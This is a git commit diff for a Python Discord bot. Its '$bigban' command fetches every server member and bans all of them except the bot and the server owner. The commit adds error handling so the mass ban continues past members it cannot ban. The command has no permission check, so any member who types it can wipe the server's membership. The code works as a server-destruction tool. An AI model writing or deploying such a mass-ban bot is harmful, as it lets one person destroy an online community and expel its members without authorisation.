8f5ed4f35398aa5e17fd70f92aff03c1c06a2833
Owen Hayes <owen.v.hayes@gmail.com>
2021-06-14 15:30:11 -0700

    Added error handling. Command fails because it cannot ban another admin.

--- main.py
+++ main.py
@@ -5,7 +5,6 @@ intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 
 
-
 @client.event
 async def on_ready():
     print(f"We have login in as {client.user}")
@@ -19,14 +18,17 @@ async def on_message(message):
         await message.channel.send("Hello!")
     if message.content.startswith("$bigban"):
         async for user in message.guild.fetch_members():
-            if user == client.user:
+            if user == client.user or user == message.guild.owner:
                 pass
             else:
                 print(f"Banning: {user}...")
-                await user.ban()
-                print(f"Banned: {user}!")
-
+                try:
+                    await user.ban(reason="Mass Ban")
+                    print(f"Banned: {user}!")
+                except discord.errors.Forbidden:
+                    print(f"Could not ban {user}")
 
 
 if __name__ == "__main__":
-    client.run("")
+    token = "token"
+    client.run(token)
